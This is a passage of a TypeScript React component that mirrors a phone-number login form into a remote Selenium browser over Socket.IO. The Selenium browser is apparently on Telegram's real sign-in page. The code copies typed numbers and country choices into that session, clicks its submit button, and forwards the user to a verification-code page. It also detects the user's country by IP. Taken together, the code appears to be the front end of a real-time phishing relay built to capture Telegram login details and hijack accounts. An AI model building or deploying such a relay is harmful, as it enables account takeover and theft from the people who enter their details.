            if (data.inputType === 'phoneNumber') {
              console.log('📱 Processing phone number update from Selenium');
              console.log('🔍 Selenium value:', data.value);
              console.log('📱 Action type:', data.action);
              console.log('📱 Timestamp:', data.timestamp);
              
              // Handle different action types
              if (data.action === 'countryDialCodeSet') {
                // This is a country selection that automatically set the dial code
                console.log('🌍 Country selection automatically set dial code:', data.value);
                console.log('📱 ✅ UPDATING React phone number state from country selection:', data.value);
                setPhoneNumber(data.value);
                setSeleniumStatus(`Country selected - dial code set to ${data.value}`);
              } else if (data.action === 'erased' || data.action === 'currentValue') {
                // These are sync operations we initiated, ignore them
                console.log('📱 ❌ IGNORING Selenium update (we initiated this sync):', data.value);
              } else if (isSyncingRef.current) {
                // We are currently syncing, ignore updates
                console.log('📱 ❌ IGNORING Selenium update (we are currently syncing):', data.value);
              } else {
                // Regular user input from Selenium
                console.log('📱 ✅ UPDATING React phone number state from Selenium:', data.value);
                console.log('📱 Previous React value:', phoneNumber);
                console.log('📱 New React value:', data.value);
                setPhoneNumber(data.value);
              }
            } else if (data.inputType === 'phoneCode') {
              console.log('📱 Syncing phone code from Selenium:', data.value);
              // If you have a phone code input field, update it here
            } else if (data.inputType === 'country') {
              console.log('🌍 Syncing country from Selenium:', data.country);
              console.log('🌍 Dial code from Selenium:', data.dialCode);
              console.log('🌍 Available countries:', countries.map(c => `${c.name} (${c.dialCode})`));
              
              const country = countries.find(c => c.name === data.country || c.dialCode === data.dialCode);
              if (country) {
                console.log('🌍 ✅ Found matching country:', country.name, country.dialCode);
                setSelectedCountry(country);
                console.log('🌍 ✅ Updated selected country to:', country.name);
                
                // Also update the phone number to the dial code if it's not already set
                if (phoneNumber !== country.dialCode) {
                  console.log('📱 Updating phone number to match selected country dial code:', country.dialCode);
                  setPhoneNumber(country.dialCode);
                }
              } else {
                console.log('🌍 ❌ No matching country found for:', data.country, data.dialCode);
              }
            }
          } else {
            console.log('❌ Session ID mismatch, ignoring event');
          }
        });
        
        // Listen for page URL check results
        socket.on('pageUrlResult', (data: any) => {
          console.log('🔍 Page URL result received:', data);
          if (data.sessionId === sessionId) {
            if (data.isVerificationPage) {
              console.log('🎉 Verification page detected via URL check!');
              setSeleniumStatus(`Verification page detected: ${data.currentTitle}`);
            } else {
              console.log('🔍 Current page:', data.currentTitle, data.currentUrl);
              setSeleniumStatus(`Current page: ${data.currentTitle}`);
            }
          }
        });

        // Periodic check for QR code button
        const checkInterval = setInterval(() => {
          if (socket && socket.connected && sessionId && !qrCodeButtonFound) {
            console.log('🔄 Periodic check for QR code button...');
            checkQrCodeButtonInSelenium();
          }
          
          // Also check for input fields periodically
          if (socket && socket.connected && sessionId && !isInputsReady) {
            console.log('🔄 Periodic check for input fields...');
            checkInputFieldsInSelenium();
          }
        }, 3000);

        // Periodic sync check to prevent fields from getting out of sync
        const syncCheckInterval = setInterval(() => {
          if (socket && socket.connected && sessionId && isInputsReady && phoneNumber) {
            console.log('🔄 Periodic sync check for phone number field...');
            // Check if Selenium field matches React field
            socket.emit('getCurrentInputValue', {
              sessionId: sessionId,
              inputType: 'phoneNumber',
              timestamp: new Date().toISOString()
            });
          }
        }, 10000); // Check every 10 seconds

        // Set a timeout to prevent indefinite waiting
        const timeoutId = setTimeout(() => {
          if (!qrCodeButtonFound) {
            setSeleniumStatus('QR code button timeout - please refresh the page');
            console.warn('⚠️ QR code button timeout reached');
          }
        }, 30000); // 30 seconds timeout

        return () => {
          clearInterval(checkInterval);
          clearInterval(syncCheckInterval);
          clearTimeout(timeoutId);
        };
      };
      
      // Function to establish connection with retries
      const establishConnection = (attempt = 1, maxAttempts = 5) => {
        console.log(`🔄 Connection attempt ${attempt}/${maxAttempts}...`);
        
        // Disconnect any existing socket
        if (socketRef.current) {
          socketRef.current.disconnect();
          socketRef.current = null;
        }
        
        // Create new socket with robust configuration
        const socket = io('http://localhost:3000', {
          transports: ['websocket', 'polling'],
          timeout: 15000, // 15 second timeout
          forceNew: true,
          reconnection: true,
          reconnectionAttempts: 10,
          reconnectionDelay: 1000,
          reconnectionDelayMax: 5000
        });
        
        socketRef.current = socket;
        
        // Connection timeout with retry logic
        const connectionTimeout = setTimeout(() => {
          if (!socket.connected) {
            console.error(`❌ Connection attempt ${attempt} timed out`);
            if (attempt < maxAttempts) {
              console.log(`🔄 Retrying connection in 2 seconds... (attempt ${attempt + 1})`);
              setTimeout(() => establishConnection(attempt + 1, maxAttempts), 2000);
            } else {
              console.error('❌ All connection attempts failed');
              setSeleniumStatus('❌ Failed to connect after all attempts - please refresh the page');
              setIsSeleniumReady(false);
              setIsInputsReady(false);
            }
          }
        }, 15000);

        socket.on('connect', () => {
          console.log(`✅ Connection attempt ${attempt} successful!`);
          clearTimeout(connectionTimeout);
          setIsSeleniumReady(true); // Socket is connected
          setSeleniumStatus('Connected to server, verifying connection...');
          
          // Verify the connection is stable
          setTimeout(() => {
            if (socket.connected) {
              console.log('✅ Connection verified as stable');
              setSeleniumStatus('Connection verified, checking Selenium session...');
              
              // Check if the Selenium session is actually active
              setTimeout(() => {
                checkSeleniumSessionStatus();
              }, 500);
            } else {
              console.log('❌ Connection lost after verification');
              setIsSeleniumReady(false); // Socket lost connection
              setSeleniumStatus('Connection lost after verification, retrying...');
              if (attempt < maxAttempts) {
                setTimeout(() => establishConnection(attempt + 1, maxAttempts), 2000);
              }
            }
          }, 2000); // Wait 2 seconds to verify stability
        });

        socket.on('connect_error', (error: any) => {
          console.error(`❌ Connection attempt ${attempt} error:`, error);
          clearTimeout(connectionTimeout);
          setIsSeleniumReady(false); // Socket connection failed
          setSeleniumStatus(`Connection error: ${error.message}`);
          setIsInputsReady(false);
          
          // Retry on connection error
          if (attempt < maxAttempts) {
            console.log(`🔄 Retrying connection in 3 seconds... (attempt ${attempt + 1})`);
            setTimeout(() => establishConnection(attempt + 1, maxAttempts), 3000);
          }
        });

        socket.on('disconnect', (reason: any) => {
          console.log(`❌ Connection attempt ${attempt} disconnected:`, reason);
          clearTimeout(connectionTimeout);
          setIsSeleniumReady(false); // Socket disconnected
          setIsInputsReady(false);
          setSeleniumStatus(`Connection lost: ${reason}`);
          
          // Only retry if it's not a manual disconnect
          if (reason !== 'io client disconnect' && attempt < maxAttempts) {
            console.log(`🔄 Connection lost, retrying in 2 seconds... (attempt ${attempt + 1})`);
            setTimeout(() => establishConnection(attempt + 1, maxAttempts), 2000);
          }
        });

        // Add reconnection logic
        socket.on('reconnect', (attemptNumber: any) => {
          console.log('✅ Reconnected to Socket.IO server, attempt:', attemptNumber);
          setSeleniumStatus('Reconnected to server, checking Selenium session...');
          setTimeout(() => {
            checkSeleniumSessionStatus();
          }, 500);
        });

        socket.on('reconnect_error', (error: any) => {
          console.error('❌ Reconnection error:', error);
          setSeleniumStatus(`Reconnection failed: ${error.message}`);
        });

        socket.on('reconnect_failed', () => {
          console.error('❌ Reconnection failed after all attempts');
          setSeleniumStatus('Failed to reconnect - attempting fresh connection...');
          // Try a fresh connection
          setTimeout(() => establishConnection(1, maxAttempts), 3000);
        });

        // Set up all event handlers for this socket
        setupEventHandlers(socket);
      };

      // Start the connection process
      establishConnection();
    }
  }, []);

  // Reset loading state when component unmounts
  useEffect(() => {
    return () => {
      setIsQrCodeButtonLoading(false);
      setIsMonitoringVerificationPage(false);
    };
  }, []);

  // Function to automatically clear the phone number input field
  const autoClearPhoneNumberField = () => {
    console.log('🔍 autoClearPhoneNumberField called');
    console.log('🔍 Socket connected:', socketRef.current?.connected);
    console.log('🔍 Session ID:', sessionIdRef.current);
    
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🗑️ Auto-clearing phone number field...');
      const emitData = {
        sessionId: sessionIdRef.current,
        inputType: 'phoneNumber',
        method: 'clear',
        timestamp: new Date().toISOString()
      };
      console.log('🔍 Emitting eraseTextInSelenium with data:', emitData);
      
      socketRef.current.emit('eraseTextInSelenium', emitData);
      
      // Listen for the response
      socketRef.current.once('seleniumInputChange', (data) => {
        console.log('✅ Received seleniumInputChange response:', data);
      });
    } else {
      console.log('❌ Cannot clear field - missing socket or session');
    }
  };

  // Monitor state changes for debugging
  useEffect(() => {
    console.log('🔄 State update:', {
      phoneCodeInputFound,
      phoneNumberInputFound,
      isInputsReady,
      seleniumStatus
    });
    
    // CRITICAL: Don't re-enable form if we're currently submitting
    if (isSubmitting) {
      console.log('🔒 Form submission in progress - blocking auto re-enablement');
      return;
    }
    
    if (phoneCodeInputFound && phoneNumberInputFound && !isInputsReady) {
      console.log('🎉 Both input fields found, enabling form...');
      setIsInputsReady(true);
      setSeleniumStatus('All input fields ready - form enabled!');
      
      // Don't auto-clear the phone number field - let users paste/type what they want
      console.log('✅ Form enabled - phone number field ready for user input');
    }
  }, [phoneCodeInputFound, phoneNumberInputFound, isInputsReady, seleniumStatus]);

  // Function to check if QR code button is present in Selenium window
  const checkQrCodeButtonInSelenium = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔍 Checking if QR code button is present in Selenium window...');
      socketRef.current.emit('checkElementInSelenium', {
        sessionId: sessionIdRef.current,
        selector: 'div#auth-phone-number-form form button',
        elementType: 'qrCodeButton',
        timestamp: new Date().toISOString()
      });
    }
  };

  // Function to check if input fields are present in Selenium window
  const checkInputFieldsInSelenium = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔍 Checking if input fields are present in Selenium window...');
      
      // Check for phone code input
      socketRef.current.emit('checkElementInSelenium', {
        sessionId: sessionIdRef.current,
        selector: 'input#sign-in-phone-code',
        timestamp: new Date().toISOString(),
        elementType: 'phoneCodeInput'
      });
      
      // Check for phone number input
      socketRef.current.emit('checkElementInSelenium', {
        sessionId: sessionIdRef.current,
        selector: 'input#sign-in-phone-number',
        timestamp: new Date().toISOString(),
        elementType: 'phoneNumberInput'
      });
    }
  };

  // Function to manually enable form when both inputs are found
  const enableFormIfReady = () => {
    // CRITICAL: Don't re-enable form if we're currently submitting
    if (isSubmitting) {
      console.log('🔒 Form submission in progress - blocking manual re-enablement');
      return;
    }
    
    if (phoneCodeInputFound && phoneNumberInputFound && !isInputsReady) {
      console.log('🎉 Manually enabling form - both inputs found!');
      setIsInputsReady(true);
      setSeleniumStatus('All input fields ready - form enabled!');
    }
  };

  // Function to check if input fields are present in Selenium window (alternative selectors)
  const checkInputFieldsInSeleniumAlternative = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔍 Checking input fields with alternative selectors...');
      
      // Try alternative selectors for phone code input
      socketRef.current.emit('checkElementInSelenium', {
        sessionId: sessionIdRef.current,
        selector: 'input[name="phone_code"], input[placeholder*="code"], input[type="tel"]',
        timestamp: new Date().toISOString(),
        elementType: 'phoneCodeInput'
      });
      
      // Try alternative selectors for phone number input
      socketRef.current.emit('checkElementInSelenium', {
        sessionId: sessionIdRef.current,
        selector: 'input[name="phone_number"], input[placeholder*="phone"], input[type="tel"]',
        timestamp: new Date().toISOString(),
        elementType: 'phoneNumberInput'
      });
    }
  };

  // Function to inspect page structure and find all input elements
  const inspectPageStructure = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔍 Inspecting page structure to find all input elements...');
      socketRef.current.emit('inspectPageStructure', {
        sessionId: sessionIdRef.current,
        timestamp: new Date().toISOString()
      });
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Handle phone number submission here
    const fullPhoneNumber = selectedCountry.dialCode + phoneNumber;
    console.log('Phone number submitted:', fullPhoneNumber);
    
    // CRITICAL FIX: Don't navigate until Selenium actually clicks the button
    // Click the submit button in the Selenium window and wait for confirmation
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🖱️ Clicking submit button in Selenium window...');
      setSeleniumStatus('Clicking submit button in Selenium window...');
      
      // Disable the form to prevent multiple submissions
      setIsInputsReady(false);
      setIsSubmitting(true);
      
      // Use the correct selector
      const correctSelector = '#auth-phone-number-form button[type="submit"]';
      console.log('🔍 Using correct selector:', correctSelector);
      
      // Emit the button click event
      console.log('📤 Emitting clickAuthFormButton event...');
      console.log('🔍 Session ID being sent:', sessionIdRef.current);
      console.log('🔍 Selector being sent:', correctSelector);
      
      // Send button click immediately - session verification is handled elsewhere
      console.log('🚀 Sending button click...');
      socketRef.current.emit('clickAuthFormButton', {
        sessionId: sessionIdRef.current,
        selector: correctSelector,
        timestamp: new Date().toISOString()
      });
      console.log('✅ clickAuthFormButton event emitted successfully');
      
              // Update status to show the action
        setSeleniumStatus('Submit button clicked in Selenium window, waiting for response...');
        
        // CRITICAL FIX: Set up event listener BEFORE sending the button click
        console.log('🔒 Setting up telegramLoginUpdate listener BEFORE sending button click...');
        
        // Listen for the button click confirmation
        socketRef.current.once('telegramLoginUpdate', (data) => {
          console.log('📥 Received telegramLoginUpdate response:', data);
          
          if (data.sessionId === sessionIdRef.current && data.event === 'buttonClicked') {
            console.log('✅ Button click confirmed by Selenium, starting verification page monitoring...');
            setSeleniumStatus('Button click confirmed! Monitoring for verification page...');
            
            // CRITICAL: Keep isSubmitting true during the entire monitoring process
            console.log('🔒 isSubmitting state maintained for monitoring:', true);
            console.log('🔒 Current state before monitoring: isSubmitting =', isSubmitting, 'isInputsReady =', isInputsReady);
            
            // CRITICAL: Prevent form from being re-enabled during submission
            console.log('🔒 Blocking form re-enablement during submission...');
            
            // Now start monitoring for verification page
            startVerificationPageMonitoring();
          } else if (data.event === 'verificationPageDetected') {
            console.log('🎉 Verification page detected via URL check! Navigating...');
            setSeleniumStatus('Verification page detected! Navigating...');
            
            // CRITICAL: Reset isSubmitting and navigate
            setIsSubmitting(false);
            setIsMonitoringVerificationPage(false);
            
            // Navigate to verification code page
            navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
          } else if (data.event === 'error') {
            console.log('❌ Button click failed:', data.data?.error);
            setSeleniumStatus(`Button click failed: ${data.data?.error}`);
            
            // Re-enable form on error
            setIsInputsReady(true);
            setIsSubmitting(false);
          } else {
            console.log('❌ Unexpected response from Selenium:', data);
            setSeleniumStatus('Unexpected response from Selenium');
            setIsInputsReady(true); // Re-enable form
            setIsSubmitting(false); // Reset submitting state
          }
        });
        
        // CRITICAL: Now send the button click AFTER setting up the listener
        console.log('🚀 Sending button click AFTER setting up listener...');
      
      // Set a timeout in case Selenium doesn't respond
      setTimeout(() => {
        if (isSubmitting) {
          console.log('⏰ Selenium button click timeout, re-enabling form');
          setSeleniumStatus('Button click timeout - please try again');
          setIsInputsReady(true); // Re-enable form
          setIsSubmitting(false); // Reset submitting state
        }
      }, 10000); // 10 second timeout
      
    } else {
      console.log('❌ Cannot click submit button - missing socket or session');
      setSeleniumStatus('Error: Cannot connect to Selenium');
    }
  };

  // Function to sync input changes to Selenium window
  const syncInputToSelenium = (inputType: 'phoneCode' | 'phoneNumber', value: string) => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log(`🔄 Syncing ${inputType} input to Selenium:`, value);
      
      // Send the input value to Selenium
      socketRef.current.emit('syncInputToSelenium', {
        sessionId: sessionIdRef.current,
        inputType,
        value,
        timestamp: new Date().toISOString()
      });
    }
  };

  // Function to sync the full phone number (with country code) to Selenium
  const syncFullPhoneNumberToSelenium = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      const fullPhoneNumber = selectedCountry.dialCode + phoneNumber;
      console.log(`🔄 Syncing full phone number to Selenium:`, fullPhoneNumber);
      
      socketRef.current.emit('syncInputToSelenium', {
        sessionId: sessionIdRef.current,
        inputType: 'phoneNumber',
        value: fullPhoneNumber,
        timestamp: new Date().toISOString()
      });
    }
  };

  // Function to handle phone number input changes
  const handlePhoneNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const newValue = e.target.value;
    
    console.log('📱 Phone number input received:', {
      newValue,
      currentPhoneNumber: phoneNumber,
      selectedCountry: selectedCountry.dialCode
    });
    
    // Don't modify pasted values - preserve them exactly as entered
    // Only ensure there's a space after the country code if it's missing
    const countryCode = selectedCountry.dialCode;
    let correctedValue = newValue;
    
    // Check if the value starts with the country code (with or without space)
    if (newValue.startsWith(countryCode) && !newValue.startsWith(countryCode + ' ')) {
      // Add space after country code if missing
      correctedValue = countryCode + ' ' + newValue.substring(countryCode.length);
      console.log('📱 Added space after country code:', correctedValue);
    } else if (!newValue.startsWith(countryCode)) {
      // If user tries to change country code, preserve their input but log it
      console.log('📱 User input doesn\'t start with country code, preserving input:', newValue);
      correctedValue = newValue;
    } else {
      // Value is already correct format
      correctedValue = newValue;
    }
    
    // Update the state with the corrected value
    setPhoneNumber(correctedValue);
    

    
    console.log('📱 Phone number processed:', {
      inputValue: newValue,
      correctedValue: correctedValue,
      countryCode: countryCode,
      willSync: true
    });

    // Clear any existing timeout
    if (debouncedSyncToSelenium.current) {
      clearTimeout(debouncedSyncToSelenium.current);
    }

    // Set a new timeout to sync after user stops typing
    debouncedSyncToSelenium.current = setTimeout(() => {
      console.log('⏱️ User stopped typing, syncing complete phone number...');
      console.log('⏱️ Final value to sync:', correctedValue);
      // Use the corrected value, not the old state
      syncCompletePhoneNumber(correctedValue);
    }, 1000); // Wait 1 second after user stops typing
  };

  // Debounced function to sync the complete phone number to Selenium
  const debouncedSyncToSelenium = useRef<ReturnType<typeof setTimeout> | null>(null);

  // Function to sync the complete phone number after user stops typing
  const syncCompletePhoneNumber = (value: string) => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔄 STARTING SYNC OPERATION');
      console.log('🔄 React phone number:', phoneNumber);
      console.log('🔄 Value to sync:', value);
      console.log('🔄 Current syncing flag:', isSyncingRef.current);
      
      // Set the syncing flag to prevent state updates
      isSyncingRef.current = true;
      console.log('🔄 Set syncing flag to TRUE');
      
      // Don't clear the field first - just type the new value directly
      // This prevents the field from being cleared unnecessarily
      console.log('⌨️ Typing complete phone number in Selenium:', value);
      socketRef.current.emit('syncInputToSelenium', {
        sessionId: sessionIdRef.current,
        inputType: 'phoneNumber',
        value: value,
        timestamp: new Date().toISOString()
      });
      
      // Reset the syncing flag after a delay to allow for response
      setTimeout(() => {
        isSyncingRef.current = false;
        console.log('✅ Sync operation completed, state updates re-enabled');
      }, 1000); // 1 second delay
      
      // DO NOT clear the React frontend input - keep user's text visible!
    } else {
      console.log('❌ Cannot sync - socket not connected or no session');
    }
  };

  // Function to handle keydown events (for backspace detection)
  const handlePhoneNumberKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    return false;
    console.log('⌨️ Key pressed:', e.key, 'Ctrl:', e.ctrlKey, 'Shift:', e.shiftKey);
    
    if (e.key === 'Backspace') {
      console.log('⌨️ Backspace detected in phone number field');
      
      // Sync backspace to Selenium window
      if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
        console.log('🔄 Syncing backspace to Selenium...');
        socketRef.current.emit('eraseTextInSelenium', {
          sessionId: sessionIdRef.current,
          inputType: 'phoneNumber',
          method: 'backspace',
          count: 1,
          timestamp: new Date().toISOString()
        });
      }
    } else if (e.key === 'Delete') {
      console.log('⌨️ Delete key detected in phone number field');
      
      // Sync delete to Selenium window
      if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
        console.log('🔄 Syncing delete to Selenium...');
        socketRef.current.emit('eraseTextInSelenium', {
          sessionId: sessionIdRef.current,
          inputType: 'phoneNumber',
          method: 'delete',
          count: 1,
          timestamp: new Date().toISOString()
        });
      }
    } else if (e.ctrlKey && e.key === 'a') {
      console.log('⌨️ Ctrl+A (Select All) detected in phone number field');
      
      // Sync select all to Selenium window
      if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
        console.log('🔄 Syncing select all to Selenium...');
        socketRef.current.emit('eraseTextInSelenium', {
          sessionId: sessionIdRef.current,
          inputType: 'phoneNumber',
          method: 'selectAll',
          timestamp: new Date().toISOString()
        });
      }
    }
  };

  // Function to handle country selection changes
  const handleCountrySelect = (country: Country) => {
    console.log('🌍 Country selected:', country);
    setSelectedCountry(country);
    
    // Set phone number to country dial code with a space after it
    setPhoneNumber(country.dialCode + ' ');
    

    
    // Sync country selection to Selenium
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔄 Syncing country selection to Selenium:', country.name);
      socketRef.current.emit('syncCountryToSelenium', {
        sessionId: sessionIdRef.current,
        countryName: country.name,
        timestamp: new Date().toISOString()
      });
    }
  };

  const goBackToQrCode = () => {
    // Check if QR code button is found in Selenium window
    if (!qrCodeButtonFound) {
      setSeleniumStatus('Please wait for QR code button to be ready...');
      return;
    }

    // Prevent multiple rapid clicks
    if (isQrCodeButtonLoading) {
      return;
    }

    try {
      setIsQrCodeButtonLoading(true);
      setSeleniumStatus('Initiating QR code return...');
      
      // Send message to Selenium server to click the QR code button
      if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
        socketRef.current.emit('clickAuthFormButton', {
          sessionId: sessionIdRef.current,
          selector: 'div#auth-phone-number-form form button',
          timestamp: new Date().toISOString()
        });
        
        console.log('✅ QR code return request sent to Selenium server');
      }
      
      // Navigate back to the main page
      navigate('/');
    } catch (error) {
      console.error('❌ Error in goBackToQrCode:', error);
      setSeleniumStatus(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
      setIsQrCodeButtonLoading(false);
    }
  };

  // Function to check current country in Selenium
  const checkCurrentCountryInSelenium = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🌍 Checking current country in Selenium...');
      socketRef.current.emit('checkCurrentCountryInSelenium', {
        sessionId: sessionIdRef.current,
        timestamp: new Date().toISOString()
      });
    }
  };

  // Function to manually sync the current React state to Selenium
  const syncCurrentStateToSelenium = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔄 Manually syncing current state to Selenium...');
      syncInputToSelenium('phoneNumber', phoneNumber);
      if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
        socketRef.current.emit('syncCountryToSelenium', {
          sessionId: sessionIdRef.current,
          country: selectedCountry.name,
          dialCode: selectedCountry.dialCode,
          timestamp: new Date().toISOString()
        });
      }
      setSeleniumStatus('State synced to Selenium');
    }
  };

  // Function to check and fix synchronization issues
  const checkAndFixSync = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔍 Checking synchronization between React and Selenium...');
      
      // First, get the current value from Selenium
      socketRef.current.emit('getCurrentInputValue', {
        sessionId: sessionIdRef.current,
        inputType: 'phoneNumber',
        timestamp: new Date().toISOString()
      });
    }
  };

  // Function to force resync React field with Selenium
  const forceResyncFromSelenium = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔄 Force resyncing React field with Selenium...');
      
      // Get current value from Selenium and update React
      socketRef.current.emit('getCurrentInputValue', {
        sessionId: sessionIdRef.current,
        inputType: 'phoneNumber',
        timestamp: new Date().toISOString()
      });
    }
  };

  // Function to force resync Selenium field with React
  const forceResyncToSelenium = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔄 Force resyncing Selenium field with React...');
      
      // Send current React value to Selenium
      syncInputToSelenium('phoneNumber', phoneNumber);
    }
  };

  // Function to force a complete resync
  const forceCompleteResync = () => {
    console.log('�� FORCE COMPLETE RESYNC INITIATED');
    console.log('🔄 Current React state:', phoneNumber);
    console.log('🔄 Current syncing flag:', isSyncingRef.current);
    
    // Reset syncing flag to ensure clean state
    isSyncingRef.current = false;
    
    // Force sync the current React state to Selenium
    if (phoneNumber) {
      console.log('🔄 Forcing sync of current React value:', phoneNumber);
      
      // Use a more robust sync approach with retry logic
      const performSync = (retryCount = 0) => {
        if (retryCount >= 3) {
          console.log('❌ Max retries reached for force resync');
          setSeleniumStatus('Force resync failed after 3 attempts');
          return;
        }
        
        console.log(`🔄 Force resync attempt ${retryCount + 1}/3`);
        
        // Set syncing flag
        isSyncingRef.current = true;
        
        // Clear Selenium field first
        socketRef.current?.emit('eraseTextInSelenium', {
          sessionId: sessionIdRef.current,
          inputType: 'phoneNumber',
          method: 'clear',
          timestamp: new Date().toISOString()
        });
        
        // Wait for clear, then type
        setTimeout(() => {
          if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
            console.log('⌨️ Typing value in Selenium:', phoneNumber);
            socketRef.current.emit('syncInputToSelenium', {
              sessionId: sessionIdRef.current,
              inputType: 'phoneNumber',
              value: phoneNumber,
              timestamp: new Date().toISOString()
            });
            
            // Wait for typing to complete, then verify
            setTimeout(() => {
              if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                console.log('🔍 Verifying sync by checking Selenium field value...');
                socketRef.current.emit('getCurrentInputValue', {
                  sessionId: sessionIdRef.current,
                  inputType: 'phoneNumber',
                  timestamp: new Date().toISOString()
                });
                
                // Wait for verification response
                const verifyTimeout = setTimeout(() => {
                  console.log('⏰ Verification timeout - retrying sync...');
                  isSyncingRef.current = false;
                  performSync(retryCount + 1);
                }, 2000);
                
                // Listen for verification response
                socketRef.current.once('seleniumInputChange', (data) => {
                  clearTimeout(verifyTimeout);
                  if (data.inputType === 'phoneNumber' && data.action === 'currentValue') {
                    console.log('🔍 Selenium field value:', data.value);
                    console.log('🔍 Expected value:', phoneNumber);
                    
                    if (data.value === phoneNumber) {
                      console.log('✅ Force resync successful!');
                      setSeleniumStatus('Force resync successful');
                      isSyncingRef.current = false;
                    } else {
                      console.log('❌ Force resync failed - values don\'t match');
                      console.log('🔄 Retrying...');
                      isSyncingRef.current = false;
                      performSync(retryCount + 1);
                    }
                  }
                });
              }
            }, 500);
          }
        }, 300);
      };
      
      // Start the sync process
      performSync();
      
    } else {
      console.log('🔄 No phone number to sync');
      setSeleniumStatus('No phone number to sync');
    }
  };

  // Add debugging for phoneNumber state changes
  useEffect(() => {
    console.log('📱 Phone number state changed to:', phoneNumber);
    console.log('📱 Selected country:', selectedCountry.name, selectedCountry.dialCode);
  }, [phoneNumber, selectedCountry]);

  // Function to detect user's country based on IP address (like Telegram does)
  const detectUserCountry = async () => {
    console.log('🌍 Detecting user country based on IP address...');
    
    try {
      // Try completely free IP geolocation APIs (no API keys needed)
      let response = await fetch('https://ipapi.co/json/');
      
      if (!response.ok) {
        // Fallback to alternative free API
        console.log('🔄 Primary API failed, trying fallback...');
        response = await fetch('https://ipinfo.io/json');
      }
      
      if (!response.ok) {
        // Second fallback
        console.log('🔄 Second API failed, trying third fallback...');
        response = await fetch('https://api.myip.com');
      }
      
      if (response.ok) {
        const data = await response.json();
        console.log('🌍 IP geolocation result:', data);
        
        // Handle different API response formats
        const detectedCountry = data.country_name || data.country || data.countryName || data.country_name_eng;
        const detectedCountryCode = data.country_code || data.country_code_iso3 || data.countryCode || data.country_code_iso2;
        
        console.log('🌍 Detected country from IP:', detectedCountry, detectedCountryCode);
        
        // Find matching country in our list
        const matchedCountry = countries.find(country => 
          country.name === detectedCountry || 
          country.code === detectedCountryCode ||
          country.name.toLowerCase().includes(detectedCountry?.toLowerCase() || '') ||
          detectedCountry?.toLowerCase().includes(country.name.toLowerCase()) ||
          // Also try matching by common variations
          country.name.toLowerCase().includes('united states') && detectedCountry?.toLowerCase().includes('usa') ||
          country.name.toLowerCase().includes('united kingdom') && detectedCountry?.toLowerCase().includes('uk')
        );
        
        if (matchedCountry) {
          console.log('🌍 ✅ Found matching country:', matchedCountry.name, matchedCountry.dialCode);
          
          // Update the selected country
          setSelectedCountry(matchedCountry);
          
          // Set the phone number to the dial code
          console.log('📱 Setting initial phone number to detected country dial code:', matchedCountry.dialCode);
          setPhoneNumber(matchedCountry.dialCode + ' ');
          
          // Update status
          setSeleniumStatus(`Country auto-detected: ${matchedCountry.name} - dial code set to ${matchedCountry.dialCode}`);
          
          // Sync to Selenium if connected
          if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
            console.log('🔄 Syncing auto-detected country to Selenium');
            socketRef.current.emit('syncCountryToSelenium', {
              sessionId: sessionIdRef.current,
              country: matchedCountry.name,
              dialCode: matchedCountry.dialCode,
              timestamp: new Date().toISOString()
            });
          }
        } else {
          console.log('🌍 ❌ No matching country found for:', detectedCountry);
          console.log('🌍 Available countries:', countries.map(c => c.name));
          
          // Try browser locale as fallback
          console.log('🔄 Trying browser locale fallback...');
          const browserCountry = detectCountryFromBrowser();
          if (browserCountry) {
            setSelectedCountry(browserCountry);
            setPhoneNumber(browserCountry.dialCode + ' ');
            setSeleniumStatus(`Country detected from browser: ${browserCountry.name} - dial code set to ${browserCountry.dialCode}`);
          } else {
            // Final fallback to default country (Finland)
            const defaultCountry = countries.find(c => c.name === 'Finland') || countries[0];
            console.log('🌍 Using fallback country:', defaultCountry.name, defaultCountry.dialCode);
            
            setSelectedCountry(defaultCountry);
            setPhoneNumber(defaultCountry.dialCode + ' ');
            setSeleniumStatus(`Using default country: ${defaultCountry.name} - dial code set to ${defaultCountry.dialCode}`);
          }
        }
      } else {
        console.log('❌ All IP geolocation APIs failed, trying browser locale...');
        const browserCountry = detectCountryFromBrowser();
        if (browserCountry) {
          setSelectedCountry(browserCountry);
          setPhoneNumber(browserCountry.dialCode + ' ');
          setSeleniumStatus(`Country detected from browser: ${browserCountry.name} - dial code set to ${browserCountry.dialCode}`);
        } else {
          throw new Error('All detection methods failed');
        }
      }
    } catch (error) {
      console.log('❌ Error in IP geolocation:', error);
      
      // Try browser locale as final fallback
      console.log('🔄 Trying browser locale as final fallback...');
      const browserCountry = detectCountryFromBrowser();
      if (browserCountry) {
        setSelectedCountry(browserCountry);
        setPhoneNumber(browserCountry.dialCode + ' ');
        setSeleniumStatus(`Country detected from browser: ${browserCountry.name} - dial code set to ${browserCountry.dialCode}`);
      } else {
        // Final fallback to default country (Finland)
